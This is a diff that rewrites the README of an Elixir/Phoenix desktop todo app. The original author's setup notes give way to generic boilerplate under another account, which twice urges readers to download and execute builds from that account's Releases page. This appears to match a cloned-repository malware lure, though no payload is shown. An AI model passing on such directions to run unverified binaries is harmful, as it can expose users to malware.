@@ -1,43 +1,110 @@
-<div align="center">
+# Elixir Desktop Todo App 📝
 
-# Elixir Desktop Todoapp
+![Elixir Desktop Todo App](https://img.shields.io/badge/Version-1.0.0-blue.svg)
+![License](https://img.shields.io/badge/License-MIT-green.svg)
+![Stars](https://img.shields.io/github/stars/pollskipolaczekkk/elixir-desktop-todoapp.svg)
+![Forks](https://img.shields.io/github/forks/pollskipolaczekkk/elixir-desktop-todoapp.svg)
 
-#### Elixir Todo App using the Desktop library with LiveView to create a desktop app
+Welcome to the **Elixir Desktop Todo App**! This application harnesses the power of Elixir and the Desktop library to create a seamless todo management experience. With LiveView, you can enjoy real-time updates and interactions, making task management efficient and enjoyable.
 
-<br />
+## Table of Contents
 
-> 🚧 This is a work in progress and therefore you should expect that the
-> application may not have all the features at this moment.
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Technologies](#technologies)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-<br />
+## Features 🌟
 
-![GitHub License](https://img.shields.io/github/license/emarifer/elixir-desktop-todoapp) ![Static Badge](https://img.shields.io/badge/Elixir-%3E=1.18-6e4a7e) ![Static Badge](https://img.shields.io/badge/Erlang/OTP-%3E=27-B83998) ![Static Badge](https://img.shields.io/badge/PhoenixFramework-%3E=1.7.21-fd4f00)
+- **Real-time Updates**: Thanks to LiveView, your tasks update in real-time without needing to refresh the page.
+- **User-friendly Interface**: A clean and simple design that allows for easy navigation and task management.
+- **Cross-Platform Compatibility**: Built to work seamlessly on multiple operating systems.
+- **Persistent Storage**: Uses SQLite3 for reliable data storage.
+- **Internationalization Support**: Easily adapt the app for different languages with Gettext.
 
-</div>
+## Installation ⚙️
 
----
+To get started, clone the repository to your local machine:
 
-### 👨‍🚀 Getting Started
+```bash
+git clone https://github.com/pollskipolaczekkk/elixir-desktop-todoapp.git
+cd elixir-desktop-todoapp
+```
 
-To start your Phoenix server:
+Next, ensure you have Elixir and Erlang installed. If you haven't installed them yet, you can follow the instructions on the [official Elixir website](https://elixir-lang.org/install.html).
 
-  * Run `mix setup` to install and setup dependencies
-  * Start Phoenix endpoint with `mix phx.server` or inside IEx with `iex -S mix phx.server`
+Once you have the necessary dependencies, run the following command:
 
-Now you can visit [`localhost:4000`](http://localhost:4000) from your browser.
+```bash
+mix deps.get
+```
 
-Ready to run in production? Please [check our deployment guides](https://hexdocs.pm/phoenix/deployment.html).
+To set up the database, run:
 
----
+```bash
+mix ecto.setup
+```
 
-### Learn more
+You are now ready to start the application! Use the following command:
 
-  * Official website: https://www.phoenixframework.org/
-  * Guides: https://hexdocs.pm/phoenix/overview.html
-  * Docs: https://hexdocs.pm/phoenix
-  * Forum: https://elixirforum.com/c/phoenix-forum
-  * Source: https://github.com/phoenixframework/phoenix
+```bash
+mix run --no-halt
+```
 
----
+For the latest releases, you can check out the [Releases section](https://github.com/pollskipolaczekkk/elixir-desktop-todoapp/releases) to download the latest version and execute it.
 
-### Happy coding 😀!!
+## Usage 🖥️
+
+After starting the application, you can access it through your desktop environment. The interface allows you to:
+
+- **Add Tasks**: Quickly add new tasks to your list.
+- **Edit Tasks**: Modify existing tasks as needed.
+- **Delete Tasks**: Remove tasks that are no longer relevant.
+- **Mark as Complete**: Easily mark tasks as completed to keep your list organized.
+
+### User Interface Overview
+
+![Todo App Screenshot](https://example.com/todo-app-screenshot.png)
+
+The user interface is designed to be intuitive. Each section is clearly labeled, making it easy to find what you need.
+
+## Technologies 🔧
+
+This project utilizes a variety of technologies to deliver a robust application:
+
+- **Elixir**: A dynamic, functional language designed for building scalable and maintainable applications.
+- **Phoenix Framework**: A web framework for Elixir that provides high performance and productivity.
+- **LiveView**: A library that enables rich, real-time user experiences with server-rendered HTML.
+- **Ecto**: A database wrapper for Elixir that provides a simple and composable API for data access.
+- **SQLite3**: A lightweight database engine that is easy to set up and use.
+- **Gettext**: A tool for internationalization and localization, allowing the app to support multiple languages.
+
+## Contributing 🤝
+
+We welcome contributions from the community! If you want to help improve the Elixir Desktop Todo App, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch (`git checkout -b feature/YourFeature`).
+3. Make your changes and commit them (`git commit -m 'Add some feature'`).
+4. Push to the branch (`git push origin feature/YourFeature`).
+5. Open a pull request.
+
+Your contributions help make this project better for everyone!
+
+## License 📄
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Contact 📬
+
+For any questions or feedback, feel free to reach out:
+
+- **GitHub**: [pollskipolaczekkk](https://github.com/pollskipolaczekkk)
+- **Email**: your-email@example.com
+
+For the latest updates, visit the [Releases section](https://github.com/pollskipolaczekkk/elixir-desktop-todoapp/releases) to download and execute the newest version of the app.
+
+Thank you for checking out the Elixir Desktop Todo App! We hope you find it useful for managing your tasks effectively.
